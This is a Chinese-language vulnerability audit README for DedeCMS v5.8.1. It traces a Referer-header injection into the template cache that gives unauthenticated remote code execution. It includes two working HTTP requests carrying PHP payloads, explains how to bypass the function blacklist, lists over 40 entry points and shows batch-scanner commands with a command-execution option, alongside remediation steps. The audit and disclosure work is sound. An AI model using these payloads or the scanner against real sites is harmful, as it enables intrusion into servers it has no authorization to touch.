# DedeCMS v5.8.1 代码审计：ShowMsg() Referer 注入到模板缓存 RCE

DedeCMS v5.8.1 官方 release 包的代码审计记录。核心问题：`ShowMsg()` 把 `Referer` 拼进模板字符串，落盘到 `data/tplcache/` 后由 `DedeTemplate::Display()` 直接 `include`，前台未登录即可执行 PHP。

## 版本与来源

- 版本：DedeCMS v5.8.1
- 源码：`https://github.com/dedecms/DedeCMS/releases/tag/v5.8.1`
- 包大小：5,639,332 字节，解压 897 个文件
- 仓库状态：`dedecms/DedeCMS` 已于 2022-01-28 归档（archived），默认分支 `master`，release 列表里 v5.8.1 仍在

## 漏洞链（行号对应 v5.8.1 原包）

| 步骤 | 文件:行 | 代码作用 |
| --- | --- | --- |
| 1 | `plus/recommend.php:28` | 空 `aid` 进入 `ShowMsg("文档ID不能为空!", "-1")` |
| 1' | `plus/flink.php:22` | 验证码失败进入 `ShowMsg('验证码不正确!', '-1')` |
| 2 | `include/common.func.php:236-237` | `$gourl == -1` 时取 `$_SERVER['HTTP_REFERER']`，零过滤 |
| 3 | `include/common.func.php:283` | `location='$gourl'` 字符串插值 |
| 4 | `include/common.func.php:304-306` | `LoadString($msg)` + `Display()` |
| 5 | `include/dedetemplate.class.php:371-377` | `WriteCache()` 后 `include $this->cacheFile` |
| 6 | `include/dedetemplate.class.php:436-455` | 写入 `data/tplcache/`，仅黑名单 `CheckDisabledFunctions()` |

## 触发

```
GET /plus/recommend.php HTTP/1.1
Host: target
Referer: <?php "system"(whoami);die;/*
```

```
GET /plus/flink.php?dopost=save HTTP/1.1
Host: target
Referer: <?php $a='syste';$b='m';$c=$a.$b;$c('whoami');?>
```

响应里出现 `location='<payload>'` 即写入成功，二次请求触发 `include`。

## 过滤器缺陷

`include/dedetemplate.class.php:419`：

```php
if ($token[0] = '306' && in_array($token[1], $disabled_functions)) {
```

`=` 是赋值。黑名单在 `:412`，`phpinfo,eval,exec,passthru,shell_exec,system,...`。字符串拆分、引号包裹函数名均可绕过。

## 前台入口清单（同一 sink，40+ 处）

- `plus/recommend.php:28,38,45,82`
- `plus/flink.php:22,35`
- `plus/carbuyaction.php:80,84,88,94,98,108,112,124,130,133,173,244,250,253`
- `plus/download.php:28,35,188,238`
- `plus/guestbook.php:57`
- `plus/posttocar.php:28,34,40,47`
- `plus/search.php:78,83,91`
- `plus/users-do.php:25,29,59,65,69,165`
- `plus/users-reg-new.php:34,44,48,52,56,65,70,79,87,94,153,198,222,228`
- `plus/users_config.php:100,181`
- `plus/view.php:106,120`

## 其他发现

- 反射型 XSS：同一 `$gourl` 进 `href='{$gourl}'`（`common.func.php:292`）
- 后台 10+ 处 base64 直写：`dede/album_add.php:172,290`、`dede/archives_add.php:150`、`dede/article_add.php:136`、`dede/soft_add.php:153`、`dede/spec_add.php:118` 等
- 后台模块上传落 `.php`：`dede/module_make.php:87,92,216,227`
- 安装目录只靠 `install/install_lock.txt` 判断（`install/index.php:42-44`）

## 已排除（不写成洞）

- `plus/vote.php:42`：`$aid` 在 `:30` 已 `is_numeric`
- `plus/mytag_js.php:28`：`:20` 已 `is_numeric`
- `plus/guestbook.php:65`：`:51` 已 `intval`
- `plus/download.php:87`：host 白名单 `in_array($linkinfo['host'], $allowed)`

## 公开情况

同一 sink 的公开 PoC 早于本次审计出现：`MzzdToT/Dedecms5.8.1RCE`（2021-11-22 创建，README 标题「DedeCMS-5.8.1 SSTI模板注入RCE」，入口 `/plus/recommend.php` + 恶意 Referer）。GitHub 上另有 5.7.x 模板注入 RCE（CVE-2025-6335，`/dede/co_get_corule.php`）、后台任意文件写入、`/member/ajax_membergroup.php` SQL 注入等记录。

本次审计的增量：把 sink 收敛到 `ShowMsg()` 单点，列出 40+ 前台入口，定位过滤器赋值写错的根因，给出 `flink.php` 免验证码路径。

## 目录

```
REPORT.md              完整审计报告
DISCLOSURE.md          时间线与公开对照
COMPARISON.md          与公开 EXP 的逐项对比
DISCLAIMER.md          使用边界与免责声明
poc/                   两个入口的原始请求
tools/cms_sink_scan.py 通用 sink 扫描器
tools/dedecms_581_rce_scan.py  12 入口 / 16 变体 并发检测 + 回显验证
publish.ps1            无 git 环境下用 REST API 发布到 GitHub
```

## 使用边界

本仓库仅面向已获得合法授权的测试环境。完整条款见 [DISCLAIMER.md](DISCLAIMER.md)。

## 批量检测

```bash
python tools/dedecms_581_rce_scan.py --list
python tools/dedecms_581_rce_scan.py -u http://target
python tools/dedecms_581_rce_scan.py -f urls.txt -t 20 -o result.csv --json result.jsonl
python tools/dedecms_581_rce_scan.py -u http://target --cmd whoami
```

判读：`written=True` 表示缓存文件写入成功；`executed=True` 才表示 PHP 真的执行了（运行期拼接标记只在执行后出现）。

## 修复

1. `ShowMsg()` 里 `$gourl` 只允许站内相对路径，不匹配回落 `-1`
2. `location='$gourl'` 改 `json_encode()`，`href` 走 `htmlspecialchars($gourl, ENT_QUOTES)`
3. 模板缓存写入前禁止出现 `<?`，命中即 unlink 并终止
4. `CheckDisabledFunctions()` 修成 `$token[0] === T_STRING`，黑名单换白名单
5. 后台写入统一白名单扩展名 + 固定目录 + 随机文件名
6. 生产包删除 `install/`

## 许可

文本 CC BY 4.0，代码 MIT。
